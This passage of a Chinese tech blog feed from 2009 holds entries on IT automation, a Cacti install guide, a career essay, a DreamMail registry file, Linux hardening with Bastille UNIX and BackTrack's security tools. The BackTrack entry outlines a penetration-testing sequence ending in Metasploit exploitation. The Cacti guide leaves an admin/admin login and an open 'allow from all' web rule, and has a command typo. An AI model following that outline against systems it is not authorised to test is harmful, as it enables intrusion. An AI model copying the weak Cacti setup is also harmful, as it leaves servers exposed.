IT流程自动化</strong></p><p>虚拟化和云计算计划将更多地依靠自动化而不是其它技术。分析师称，IT流程自动化工具已经成为部署虚拟服务器企业的必不可少的工具。但是，没有自动化，云计算服务和IT机构的潜力就不能发挥出来。</p><p>企业管理协会的研究经理Jim Frey说，人们需要一切都自动化，从配置虚拟服务器到审计环境和保证一致的设置都需要自动化。在监视方面，自动化将能够跟上虚拟环境的步伐并且能够识别出人类操作人员察觉不到的变化。自动化甚至还能用于实施性能分析并且发现潜在的问题，防止这些问题损害在这些环境中交付的IT服务。IT流程自动化预计将有强劲的需求，那些没有把重点直接放在管理软件方面的企业甚至将投资这个技术。例如，微软最近收购了IT流程自动化厂商Opalis。分析师说，厂商认识到自动化在2010年对于IT机构将是多么重要。</p><p>Mann说，IT流程自动化是一个真正需要的技术。当你谈到虚拟系统的时候，这个技术就更加重要，因为虚拟化需要快速的反应，它需要以自动化的速度完成任务，而不是以人类的速度。微软是不了解自动化的厂商之一。因此，这个收购将使微软有机会把自动化扩展到Azure和其它云计算环境，因为云计算需要的工作流和编排水平是微软依靠自己在短期内做不到的。</p><p><strong>5. IT资源规划</strong></p><p>已经在使用虚拟化技术并且希望探索云计算的IT机构还需要在2010年应用IT资源规划流程和技术。把容量规划和财务管理的原则以及使用和服务测量结合在一起，IT资源规划将使IT部门理解服务是如何消费的，并且保证在最动态的环境中能够迅速对业务需求做出反应。</p><p>Gartner负责研究的副总裁Cameron Haight说，目前的容量规划就是要保证你有足够的容量和内存周期来满足工作流的需求。但是，虚拟化引起一些需要考虑的新的变量。耗电量只是其中之一。对于IT资源规划来说，还有更多的因素需要考虑。这些流程在企业中必须是更有战略性的。</p><p>Gartner分析师在今年年初发表的一篇报告中详细介绍了对于适当的企业IT资源规划必须要考虑的许多变量。Gartner的报告称，传统的 IT容量管理衡量指标必须与业务需求、人力资本、财务指标、设施和电力数据、风险和遵守法规的信息以及工作负荷位置等因素一起考虑。其它考虑包括设置管理、资产评估、改变管理、事件管理和效绩管理等。</p><p>Haight说，我可以想象有这么一天IT容量规划人员将必须查看他们在任何指定的一天所需要的资源并且考虑他们应该使用内部资源还是外部提供商来得到最好的价值。IT机构将需要得到现成的工具以便迅速分析多个来源的服务的成本、质量和性能并且根据逐项分析选择最佳的选择。这种事情成为现实的日子已经为期不远了。</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>cacti中文版在Centos5(Rhel5)上的安装</title>
      <link href="/2009/12/29/cacti-chinese-version-installed-on-centos5-rhel5/"/>
      <url>/2009/12/29/cacti-chinese-version-installed-on-centos5-rhel5/</url>
      <content type="html"><![CDATA[<h2 id="cacti中文版在Centos5-Rhel5-上的安装"><a href="#cacti中文版在Centos5-Rhel5-上的安装" class="headerlink" title="cacti中文版在Centos5(Rhel5)上的安装"></a>cacti中文版在Centos5(Rhel5)上的安装</h2><p><strong>1.基本安装</strong><br>            cacti是运作在apache+php+mysql+net-snmp工具集+rrdtool这样的一个工作环境之下，所以我们先要做一个基本的工作的环境<br>            记的安装前先安装rpm的扩展包，安装方法见我的另外一个文章”rpm的高级管理”  </p><pre><code>#yum -y install mysql mysql-server php-mysql httpd php  上面完成一个php,http,mysql的环境，接下来安装要用到的包  </code></pre><p>#yum -y install php-pdo lm_sensors net-snmp php-snmp net-snmp-utils net-snmp-libs perl-Net-Daemon perl-PlRPC perl-DBI rrdtool perl-rrdtool perl-DBD-MySQL<br>            安装完,启动相关的程式，和设置开机启动  </p><pre><code>#chkconfig mysqld on  #chkconfig httpd on  #server mysqld start  **2.数据库设置**  准备数据库，和设置权限，安装cacti。  #mysql -uroot -p  mysql&gt;create database cacti default character set utf8;  </code></pre><p>mysql&gt;GRANT SELECT, INSERT, UPDATE, DELETE, INDEX, ALTER, CREATE,LOCK TABLES, CREATE TEMPORARY TABLES, DROP, REFERENCES ON cacti.* TOcacti@localhost IDENTIFIED BY ?passwd?;<br>            mysql&gt;flush privileges;<br>            mysql&gt; \q<br>            <strong>3.下载安装</strong><br>            下载中文的cacti,解压到/var/www/cacti.后进入cacti的目录.导入cacti的数据结构<br>            下载地址: <a href="http://blogimg.chinaunix.net/blog/upfile2/071218223453.gz" target="_blank" rel="noopener">cacti-0.8.7a-cn-utf8.tar.gz</a>  </p><pre><code># cd /var/www/cacti  # mysql -u cacti -p cacti &lt; cacti.sql  修改配置文件  # vim /var/www/cacti/include/config.php  \$database_type = &quot;mysql&quot;;  \$database_default = &quot;cacti&quot;;  \$database_hostname = &quot;localhost&quot;;  \$database_username = &quot;cacti&quot;;  \$database_password = &quot;passwd&quot;;  \$database_port = &quot;3306&quot;;  添加cacti用户  \$useradd cacti -d /var/www/cacti -s /bin/false  \$chown -R cacti /var/www/cacti/rra /var/www/cacti/log  这个上面可能添加不行试试:  #chown -hR cacti /var/www/cacti/rra /var/www/cacti/log  **4\. 配置httpd服务器的配置文件**  # vim /etc/httpd/conf.d/cacti.conf  Alias /cacti /var/www/cacti  &lt;Directory /var/www/cacti&gt;  DirectoryIndex index.php  AllowOverride all  order deny,allow  deny from all  allow from all  AddType application/x-httpd-php .php  php\_flag magic\_quotes_gpc on  php\_flag track\_vars on  &lt;/Directory&gt;  重起httpd的服务，让上面的修改生效  # /etc/init.d/httpd restart  **  5.测试安装是否正常**  打开下面的url.  [http://server.ip.or.name/cacti](http://server.ip.or.name/cacti)  打开网站，点next.选择new install,使用一路回车法.最后完成  最后的用户名为: admin 密码为: admin  **6.收尾**  让系统每5分钟收集,需要  crontab -e  */5 * * * * cacti php /var/www/cacti/poller.php &amp;&gt;/dev/null  也可手工跑一次:/var/www/cacti/poller.php  **7。字体在图形中显示不正常的解决方法**  下载并安装cjkuni-fonts中文字体，字体名ukai.ttf,下载地址  [http://ftp.tw.debian.org/debian/pool/main/t/ttf-arphic-ukai/ttf-arphic-ukai_0.1.20060928.orig.tar.gz](http://ftp.tw.debian.org/debian/pool/main/t/ttf-arphic-ukai/ttf-arphic-ukai_0.1.20060928.orig.tar.gz)  #tar zxvf ttf-arphic-ukai_0.1.20060928.orig.tar.gz  # cd ttf-arphic-ukai-0.1.20060928/  # cp ukai.ttf /usr/share/fonts/ukai.ttf  安装完成后注意在&quot;设置&quot;中更改下面两个必改项.  常规-&gt;RRDTool应用程序版本 改为1.2.x,默认为1.0.x.不改可能图像不能正常显示出来.  路径-&gt;RRDTool默认字体路径 改为上面安装的ukai.ttf的文件路径,如/usr/share/fonts/ukai.ttf</code></pre>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>毕业后5年决定命运</title>
      <link href="/2009/12/29/five-years-after-graduation-decide-fate/"/>
      <url>/2009/12/29/five-years-after-graduation-decide-fate/</url>
      <content type="html"><![CDATA[<p>正如’打工皇帝’唐骏说：’我觉得有两种人不要跟别人争利益和价值回报。第一种人就是刚刚进入企业的人，头5年千万不要说你能不能多给我一点儿工资，最重要的是能在企业里学到什么，对发展是不是有利……’</p><p>人总是从平坦中获得的教益少，从磨难中获得的教益多；从平坦中获得的教益浅，从磨难中获得的教益深。一个人在年轻时经历磨难，如能正确视之，冲出黑暗，那就是一个值得敬慕的人。最要紧的是先练好内功，毕业后这5年就是练内功的最佳时期，练好内功，才有可能在未来攀得更高。</p><p>出路在哪里？出路在于思路！</p><pre><code>其实，没有钱、没有经验、没有阅历、没有社会关系，这些都不可怕。没有钱，可以通过辛勤劳动去赚；没有经验，可以通过实践操作去总结；没有阅历，可以一步一步去积累；没有社会关系，可以一点一点去编织。但是，没有梦想、没有思路才是最可怕的，才让人感到恐惧，很想逃避!</code></pre><p>　　人必须有一个正确的方向，无论你多么意气风发，无论你是多么足智多谋，无论你花费了多大的心血，如果没有一个明确的方向，就会过得很茫然，渐渐就丧失了斗志，忘却了最初的梦想，就会走上弯路甚至不归路，枉费了自己的聪明才智，误了自己的青春年华。</p><p>　　荷马史诗《奥德赛》中有一句至理名言：’没有比漫无目的地徘徊更令人无法忍受的了。’毕业后这5年里的迷茫，会造成10年后的恐慌，20年后的挣扎，甚至一辈子的平庸。如果不能在毕业这5年尽快冲出困惑、走出迷雾，我们实在是无颜面对10年后、20年后的自己。毕业这5年里，我们既有很多的不确定，也有很多的可能性。</p><p>　　毕业这5年里，我们既有很多的待定，也有很多的决定。</p><p>　　迷茫与困惑谁都会经历，恐惧与逃避谁都曾经有过，但不要把迷茫与困惑当作可以自我放弃、甘于平庸的借口，更不要成为自怨自艾、祭奠失意的苦酒。生命需要自己去承担，命运更需要自己去把握。在毕业这5年里，越早找到方向，越早走出困惑，就越容易在人生道路上取得成就、创造精彩。无头苍蝇找不到方向，才会四处碰壁；一个人找不到出路，才会迷茫、恐惧。</p><p>　　生活中，面对困境，我们常常会有走投无路的感觉。不要气馁，坚持下去，要相信年轻的人生没有绝路，困境在前方，希望在拐角。只要我们有了正确的思路，就一定能少走弯路，找到出路！</p><p>　　成功的人不是赢在起点，而是赢在转折点。</p><p>　　不少刚刚毕业的年轻人，总是奢望马上就能找到自己理想中的工作。然而，很多好工作是无法等来的，你必须选择一份工作作为历练。职业旅程中的第一份工作，无疑是踏入社会这所大学的起点。也许你找了一份差强人意的工作，那么从这里出发，好好地沉淀自己，从这份工作中汲取到有价值的营养，厚积薄发。千里之行，始于足下，只要出发，就有希望到达终点。</p><p>　　起点可以相同，但是选择了不同的拐点，终点就会大大不同！</p><p>　　毕业这几年，我们的生活、感情、职业等都存在很多不确定的因素，未来也充满了各种可能。这个时候，必须学会选择，懂得放弃，给自己一个明确的定位，使自己稳定下来。如果你不主动定位，就会被别人和社会’定型’！</p><p>　　可以这么说：一个人在毕业这5年培养起来的行为习惯，将决定他一生的高度。我们能否成功，在某种程度上取决于自己对自己的评价，这就是定位。你给自己定位是什么，你就是什么。定位能决定人生，定位能改变命运。丑小鸭变成白天鹅，只要一双翅膀；灰姑娘变成美公主，只要一双水晶鞋。</p><p>　　人的命，三分天注定，七分靠打拼，有梦就’会红’，爱拼才会赢。只要不把自己束缚在心灵的牢笼里，谁也束缚不了你去展翅高飞。</p><p>　　现实情况远非他们所想的那样。于是，当优越感逐渐转为失落感甚至挫败感时，当由坚信自己是一块’金子’到怀疑自己是一粒’沙子’时，愤怒、迷茫、自卑就开始与日俱增。</p><p>　　其实，应该仔细掂量一下自己，你是否真是金子？是真金，手中要有绝活，才能上要有过人之处才行。一句话：真金是要靠实力来证明的，只有先把自己的本领修炼好了，才有资格考虑伯乐的事情</p><p>　　每颗珍珠原本都是一粒沙子，但并不是每一粒沙子都能成为一颗珍珠。</p><p>　　想要卓尔不群，就要有鹤立鸡群的资本。忍受不了打击和挫折，承受不住忽视和平淡，就很难达到辉煌。年轻人要想让自己得到重用，取得成功，就必须把自己从一粒沙子变成一颗价值连城的珍珠。</p><p>　　天气有下雨与日出，人生有高峰与低谷。莫为浮云遮望眼，风物长宜放眼量。只要拂去阴霾，就能亮出朗朗晴空。如果你在工作上有些不如意，要相信自己不会一直处于人生的低谷期，总有一天能冲破重重云层。告诉自己：我并没有失败，只是暂时没有成功！只要在内心点亮一盏希望之灯，一定能驱散黑暗中的阴霾，迎来光明。</p><p>　　的确，论资历，他们是不折不扣的职场菜鸟，业务涉及不深，人脉一穷二白，在工作中经常碰壁。他们的压力并不一定都像千钧大石，而是像大雨来临前的天色，灰色低沉，明明有空间，却被灰色填满每个缝隙，只能等待大雨倾盆之后的晴空。</p><p>　　‘起得比鸡早，睡得比狗晚，干得比驴多，吃得比猪差。’这是很多刚刚毕业的人喜欢用来调侃自己生活状态的话。虽然有点儿夸张，但是，他们中的很多人的确一直都被灰色心情所笼罩–心里永远是多云转阴。记得有位哲人曾说：’我们的痛苦不是问题本身带来的，而是我们对这些问题的看法产生的。’换个角度看人生，是一种突破、一种解脱、一种超越、一种高层次的淡泊与宁静，从而获得自由自在的快乐。</p><p>　　一位哲人说：’人生就是一连串的抉择，每个人的前途与命运，完全把握在自己手中，只要努力，终会有成。’就业也好，择业也罢，创业亦如此，只要奋发努力，都会成功。你是不是准备把生命的承诺全部都交给别人？</p><p>　　毕业后这5年，是改变自己命运的黄金时期。在最能决定自己命运时，如果还不把握，那你还要等到什么时候呢？我的人生我做主，命运由己不由人。</p><p>　　不要活在别人的嘴里，不要活在别人的眼里，而是把命运握在自己手里。</p><p>别说你没有背景，自己就是最大的背景。美国作家杰克·凯鲁亚克说过一句话：’我还年轻，我渴望上路。’在人生的旅途中，我们永远都是年轻人，每天都应该满怀渴望。每个人的潜能都是无限的，关键是要发现自己的潜能和正确认识自己的才能，并找到一个能充分发挥潜能的舞台，而不能只为舞台的不合适感到不快。要客观公正地看待自己的能力，结合自己的实际情况和爱好冷静选择，尽可能到最需要自己、最适合自己的地方。</p><p>　　在人力资源管理界，特别流行一个说法，即’骑马，牵牛，赶猪，打狗’理论：人品很好，能力又很强的，是千里马，我们要骑着他；人品很好但能力普通的，是老黄牛，我们要牵着他；人品、能力皆普通的，就是’猪’，我们要赶走他；人品很差能力很强的，那是’狗’，我们要打击他。</p><p>　　我想，刚刚毕业几年的你，一样胸怀大志，一样想成为一匹被人赏识、驰骋沙场的千里马吧？那么，就好好沉淀下来。低就一层不等于低人一等，今日的俯低是为了明天的高就。所谓生命的价值，就是我们的存在对别人有价值。能被人利用是一件好事，无人问津才是真正的悲哀！</p><p>　　能干工作、干好工作是职场生存的基本保障。任何人做工作的前提条件都是他的能力能够胜任这项工作。能干是合格员工最基本的标准，肯干则是一种态度。一个职位有很多人都能胜任，都有干好这份工作的基本能力，然而，能否把工作做得更好一些，就要看是否具有踏实肯干、苦于钻研的工作态度了。</p><p>　　在能干的基础上踏实肯干</p><p>　　工作中，活干得比别人多，你觉得吃亏；钱拿得比别人少，你觉得吃亏；经常加班加点，你觉得吃亏……其实，没必要这样计较，吃亏不是灾难，不是失败，吃亏也是一种生活哲学。现在吃点儿小亏，为成功铺就道路，也许在未来的某个时刻，你的大福突然就来了。</p><p>　　能吃亏是做人的一种境界，是处世的一种睿智。</p><p>　　在工作中并不是多做事或多帮别人干点儿活就是吃亏。如果领导让你加加班、赶赶任务，别以为自己吃了大亏，反而应该感到庆幸，因为领导只叫了你，而没叫其他人，说明他信任你、赏识你。吃亏是一种贡献，你贡献得越多，得到的回报也就越多。乐于加班，就是这样的一种吃亏。</p><p>　　舍得舍得，有舍才有得；学会在适当时吃些亏的人绝对不是弱智，而是大智。</p><p>　　给别人留余地就是给自己留余地，予人方便就是予己方便，善待别人就是善待自己。</p><p>　　傻人有傻福，因为傻人没有心计。和这样的人在一起，身心放松，没有太多警惕，就能相互靠近。傻在很多时候意味着执着和忠贞，也意味着宽厚和诚实，让人不知不觉站到他一边。傻人无意中得到的，比聪明人费尽心机得到的还多。毕业这几年，你的天空中只飘着几片雪花，这样你就满足了吗？成功需要坚持与积累，与其专注于搜集雪花，不如省下力气去滚雪球。巴菲特说：’人生就像滚雪球，最重要的是发现很湿的雪和很长的坡。’让自己沉淀下来，学着发现’很湿的雪’，努力寻找’很长的坡’。记住：散落的雪花会很快融化，化为乌有，只有雪球才更实在，才能长久。</p><p>　　在毕业这几年里，你要是能做到比别人多付出一分努力，就意味着比别人多积累一分资本，就比别人多一次成功的机会。</p><p>　　什么是职业化呢？职业化就是工作状态的标准化、规范化、制度化，即在合适的时间、合适的地点用合适的方式说合适的话、做合适的事，使知识、技能、观念、思维、态度、心理等符合职业规范和标准。</p><p>　　‘在每个行业里，都有很多出色的人才，他们之所以能存在，是因为比别人更努力、更智慧、更成熟。但是，最重要的是，他们比一般人更加职业化！这就是为什么我现在能当你老板的原因。一个人仅仅专业化是不够的，只有职业化的人才能飞在别人前面，让人难以超越！’不要以为我们现在已经生存得很安稳了。对于毕业5年的人来讲，一定要认清即将面临的五大挑战。</p><p>　　　　一、赡养父母。</p><p>　　　　二、结婚生子。</p><p>　　　　三、升职加薪。</p><p>　　　　四、工作压力。</p><p>　　　　五、生活质量。</p><p>　　有的人为生存而雀跃，目光总是停在身后，三天打鱼两天晒网，有始无终。</p><p>　　有的人为发展而奋斗，目光总是盯在正前方，每天进步一点点，坚持不懈。</p><p>　　毕业这几年，不能没有追求和探索，不能没有理想和目标。人生如逆水行舟，不进则退。甘于现状的生活就是不再前行的船，再也无法追上时代前进的步伐。一定要抓紧每一秒钟的时间来学习，要明白学习不是学生的专利。小聪明的人最得意的是：自己做过什么？大智慧的人最渴望的是：自己还要做什么？</p><p>　　小聪明是战术，大智慧是战略；小聪明看到的是芝麻，大智慧看到的是西瓜。</p><p>　　在这个世界上，既有大人物，也有小角色，大人物有大人物的活法，小人物有小人物的潇洒，每个人都有自己的生活方式，谁也勉强不了谁。但是，小聪明只能有小成绩和小视野，大智慧才能有大成就和大境界。小企业看老板，中企业看制度，大企业看文化。</p><p>　　小公司与大企业都有生存之道，没有好坏之分，但对一个人不同阶段的影响会不同。</p><p>　　小公司肯定想要发展为大企业，这是一种目标，年轻人也要给自己的职业生涯制定目标。毕业几年的你，是否经常会怯场或者是感到没有底气？居安思危绝对不是危言耸听！此刻打盹，你将做梦；此刻学习，你将圆梦。在竞争激烈的人生战场上，打盹的都是输家！</p><p>　　每个人在年轻的时候似乎都豪情万丈，什么都不怕，可是随着年龄的增长，每天想着房子、工作、养家糊口这些俗事儿，再也没有年轻时那种敢于’上天探星、下海捞月’的勇气了。是我们改变了生活，还是生活改变了我们？我们的思想越来越复杂，因为有了越来越多的舍不得、越来越多的顾虑，我们总是在徘徊、总是在犹豫。毕业开始一两年，生活的重担会压得我们喘不过气来，挫折和障碍堵住四面八方的通口，我们往往在压迫得自己发挥出潜能后，才能杀出重围，找到出路。可是两三年后，身上的重担开始减轻，工作开始一帆风顺，我们就松懈了下来，渐渐忘记了潜在的危险。直到有一天危机突然降临，我们在手足无措中被击败……毕业这几年，仍然处于危险期，一定要有居安思危的意识，好好打拼，这样才能有一个真正的安全人生！</p><p>　　生于忧患，死于安乐。如果你想跨越自己目前的成就，就不能画地自限，而是要勇于接受挑战。对畏畏缩缩的人来说，真正的危险正在于不敢冒险！</p><p>年轻人在社会的重压下，适应能力已变得越来越强，只是他们不自觉地习惯被环境推着走。他们不敢冒险，怕给自己带来终身的遗憾，于是告慰自己：’我对得起自己、对得起家人，因为我已竭尽全力。’其实，人只有不断挑战和突破才能逐渐成长。长期固守于已有的安全感中，就会像温水里的青蛙一样，最终失去跳跃的本能。</p><p>　　经历了这几年社会生活，你应该明白：这个世界上有富也有贫，有阴也有亮，有丑也有美，到底看到什么，取决于自己是积极还是消极。在年轻时学会勤勉地工作，用一种光明的思维对待生活，那么，只要张开手掌，你就会发现，里面有一片灿烂的人生。</p><p>　　把感恩刻在石头上，深深地感谢别人帮助过你，永远铭记，这是人生应有的一种境界；把仇恨写在沙滩上，淡淡忘掉别人伤害过你，学会宽容，让所有的怨恨随着潮水一去不复返，这也是一种人生境界。</p><p>学会倒出水，才能装下更多的水。从毕业那天开始，学会把每天都当成一个新的起点，每一次工作都从零开始。如果你懂得把’归零’当成一种生活的常态，当成一种优秀的延续，当成一种时刻要做的事情，那么，经过短短几年，你就可以完成自己职业生涯的正确规划与全面超越。</p><p>　　在职业起步的短短道路上，想要得到更好、更快、更有益的成长，就必须以归零思维来面对这个世界。不要以大学里的清高来标榜自己，不要觉得自己特别优秀，而是要把自己的姿态放下，把自己的身架放低，让自己沉淀下来，抱着学习的态度去适应环境、接受挑战。放下’身段’才能提高身价，暂时的俯低终会促成未来的高就。</p><p>　　年轻人从校园或者从一个环境进入一个新环境，就要勇于将原来环境里熟悉、习惯、喜欢的东西放下，然后从零开始。我们想在职场上获得成功，首先就要培养适应力。从自然人转化为单位人是融入职场的基本条件。一个人起点低并不可怕，怕的是境界低。越计较自我，便越没有发展前景；相反，越是主动付出，那么他就越会快速发展。很多今天取得一定成就的人，在职业生涯的初期都是从零开始，把自己沉淀再沉淀、倒空再倒空、归零再归零，正因为这样，他们的人生才一路高歌，一路飞扬。</p><p>　　在毕业这几年里，我们要让过去归零，才不会成为职场上那只背着重壳爬行的蜗牛，才能像天空中的鸟儿那样轻盈地飞翔。请好好品味一下杰克·韦尔奇说过的一句话：’纠正自己的行为，认清自己，从零开始，你将重新走上职场坦途。’　吐故才能纳新，心静才能身凉，有舍才能有得，杯空才能水满，放下才能超越。</p><p>归零思维五大表现：心中无我，眼中无钱，念中无他，朝中无人，学无止境。</p><p>　　年轻人难免带着几分傲气，认为自己无所不能、所向披靡，其实不然，初入职场的新人还是个’婴儿’，正处在从爬到走的成长阶段。在毕业这几年里，一定要让自己逐步培养起学徒思维、海绵思维、空杯思维，具有这样思维的人心灵总是敞开的，能随时接受启示和一切能激发灵感的东西，他们时刻都能感受到成功女神的召唤。</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>XP/Vista/win2008下更改默认邮件客户端</title>
      <link href="/2009/12/28/change-the-default-mail-client-for-xp-vista-win2008/"/>
      <url>/2009/12/28/change-the-default-mail-client-for-xp-vista-win2008/</url>
      <content type="html"><![CDATA[<p> 还是老方法，保存成Default Mail.reg。然后把dreammail改名字，再改路径。最后导入注册表，更改默认程序。</p><p>Windows Registry Editor Version 5.00</p><p>[HKEY_CLASSES_ROOT\DreamMail.Url.Mailto]</p><p>@=”URL:Mail Protocol”</p><p>“EditFlags”=dword:00000002</p><p>“URL Protocol”=””</p><p>“FriendlyTypeName”=”Dream Mail”</p><p>[HKEY_CLASSES_ROOT\DreamMail.Url.Mailto\DefaultIcon]</p><p>@=”D:\\Program Files (Green)\\DM2005\\DM2005.exe”</p><p>[HKEY_CLASSES_ROOT\DreamMail.Url.Mailto\shell]</p><p>[HKEY_CLASSES_ROOT\DreamMail.Url.Mailto\shell\open]</p><p>[HKEY_CLASSES_ROOT\DreamMail.Url.Mailto\shell\open\command]</p><p>@=”\“D:\\Program Files (Green)\\DM2005\\DM2005.exe\“  /mailurl:\“%1\“”</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail]</p><p>@=”Dream Mail”</p><p>;邮件程序MAPI.dll路径</p><p>“DLLPath”=”D:\\Program Files (Green)\\DM2005\\Sys\\DmMapi.dll”</p><p>“LocalizedString”=”Dream Mail Client Program”</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\Capabilities]</p><p>;默认程序里显示的注释</p><p>“ApplicationDescription”=”Dream Mail Client Program”</p><p>;默认程序里显示的名字</p><p>“ApplicationName”=”Dream Mail”</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\Capabilities\FileAssociations]</p><p>;.eml文件关联</p><p>;”.eml”=”Microsoft Internet Mail Message”</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\Capabilities\StartMenu]</p><p>;开始菜单属性里显示的名字</p><p>“Mail”=”Dream Mail”</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\Capabilities\URLAssociations]</p><p>;与前面的HKEY_CLASSES_ROOT\DreamMail.Url.Mailto相对应</p><p>“mailto”=”DreamMail.Url.mailto”</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\Protocols]</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\Protocols\mailto]</p><p>@=”URL:MailTo Protocol”</p><p>“EditFlags”=hex:02,00,00,00</p><p>“URL Protocol”=””</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\Protocols\mailto\DefaultIcon]</p><p>@=”D:\\Program Files (Green)\\DM2005\\DM2005.exe”</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\Protocols\mailto\shell]</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\Protocols\mailto\shell\open]</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\Protocols\mailto\shell\open\command]</p><p>@=”\“D:\\Program Files (Green)\\DM2005\\DM2005.exe\“ %1”</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\shell]</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\shell\open]</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\shell\open\command]</p><p>@=”\“D:\\Program Files (Green)\\DM2005\\DM2005.exe\“”</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\RegisteredApplications]</p><p>;与前面的HKEY_LOCAL_MACHINE\SOFTWARE\Clients\Mail\DreamMail\Capabilities相对应</p><p>“Dream Mail”=”SOFTWARE\\Clients\\Mail\\DreamMail\\Capabilities”</p><p>实验过后，还差一点，就是还要在IE浏览器，属性－》程序里把，电子邮件选择成dreammail,就可以 了。</p>]]></content>
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用Bastille UNIX来加固Linux系统</title>
      <link href="/2009/12/25/use-bastille-unix-to-shore-up-your-linux-system/"/>
      <url>/2009/12/25/use-bastille-unix-to-shore-up-your-linux-system/</url>
      <content type="html"><![CDATA[<p>即使存在我以前提到的普遍的脆弱性，Linux仍然是一个经得起安全测试的稳定的操作系统（OS）。然而这并不意味着你就可以不设防。随着时间的推移、配置的变更、第三方软件和人为的干涉都容易改变曾经安全的Linux系统的安全状况。这必然导致，至少在脆弱性评估和审计报告中反复出现。</p><p>　　但是有一个方法可以建立一个巩固的Linux安全基础，为你业务未来的成功提供保障，这就是通过Bastille UNIX来加固你的Linux系统，它是由Jay Beale领导的一个开源项目。</p><p>　　先前命名为Bastille Linux的Bastille UNIX可以通过基于图形界面（GUI）引导你完成加固OS的过程，这适用于Debian、 Gentoo、Mandriva、 Red Hat 和SUSE Linux , 以及 HP-UX和Mac OS X系统。它的直观的问答方式使你可以锁定你的系统而不必担心错敲或者不正确的配置。Bastille不仅仅是一个加固程序——它也是一个很好的学习帮助，可以用来教学。</p><p>　　Bastille UNIX的下载和运行都比较容易。有许多系统加固的种类可以选择，包括补丁、文件许可、帐户安全、域名系统等等。如图1所示，Bastille提示用户一些具体的问题并提供详细的解释来确保每一个动作的效果都可以理解。</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/ttcma_techtarget_2009-11-12-14-52-07.gif" alt="使用Bastille UNIX来加固Linux系统 - suchalin - 为了更好的生活而奋斗！" title="使用Bastille UNIX来加固Linux系统 - suchalin - 为了更好的生活而奋斗！"></p><p>图1――Bastille UNIX系统加固问题和解释（点击图片本身就能放大）</p><p>　　用Bastille，你总是可以撤销已经做的修改。然而正如Bastille UNIX站点所述，如果已经做了许多手动的改变，这也许没有太大的用处，因为程序在持续运行。这仍然有一个变动管理的问题需要你自己处理，而非是Bastille的缺点。</p><p>　　如果你更愿意手动方法，你可以一直手动来加固你的Linux系统。网站上有许多的Linux加固的最佳实践，例如Internet安全中心的基准和防御信息系统代理UNIX安全实施指南。</p><p>　　花时间来加固你的Linux系统将使你在短期内添加更多的工作，并且如果你不小心，你将使你加固的系统停止工作。慎重但是决不要被吓倒。花一点时间、费用和努力增加Linux的安全性你会越来越觉得是值得的。一个安全的系统，在安全评估和审计报告中较少的问题终将使你受益，帮助你使令人厌烦的东西处于掌控之中。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用BackTrack检查Linux安全漏洞</title>
      <link href="/2009/12/25/use-backtrack-to-check-linux-security-vulnerabilities/"/>
      <url>/2009/12/25/use-backtrack-to-check-linux-security-vulnerabilities/</url>
      <content type="html"><![CDATA[<p>无论你是否用过<a href="http://searchenterpriselinux.techtarget.com/tip/0,289483,sid39_gci1373555,00.html" target="_blank" rel="noopener">Bastille UNIX工具</a>，以便手动加固你的Linux系统，或者只是想对目前系统的状态进行快照，你需要使用<a href="http://www.remote-exploit.org/backtrack.html" target="_blank" rel="noopener">BackTrack</a>。这是款基于Slackware Linux的版本，通过启动CD或虚拟机镜像（VMI）运行。在官方的第三个版本（如果你计算<a href="http://www.remote-exploit.org/backtrack_download.html" target="_blank" rel="noopener">最新发布的就是第四版</a>），BackTrack含有方便的安全工具，用于检测Linux系统里的漏洞。本着“黑客入侵”的精神，BackTrack集成这种通常的安全测试方法：</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/ttcma_techtarget_2009-11-27-09-57-25.jpg" alt="使用BackTrack检查Linux安全漏洞 - suchalin - 为了更好的生活而奋斗！" title="使用BackTrack检查Linux安全漏洞 - suchalin - 为了更好的生活而奋斗！"></p><p>图1：BackTrack的安全测试方法</p><p>　　BackTrack包含利基安全工具，很难下载、编译和安装。无论你是Linux技术专家或新手，很难下载完整版本的Linux与安全测试工具。BackTrack的主要接口如下图所示：</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/ttcma_techtarget_2009-11-27-09-57-45.jpg" alt="使用BackTrack检查Linux安全漏洞 - suchalin - 为了更好的生活而奋斗！" title="使用BackTrack检查Linux安全漏洞 - suchalin - 为了更好的生活而奋斗！"></p><p>图2：BackTrack桌面和安全工具目录</p><p>　　使用BackTrack测试内部Linux系统的常用安全评估情景如下：</p><ol><li>使用fping识别活动主机</li><li>使用nmap识别操作系统和检测打开的端口</li><li>使用amap识别正在运行的应用</li><li>使用SAINT查找操作系统里的漏洞</li><li>使用Metasploit开发操作系统和应用漏洞</li></ol><p>　　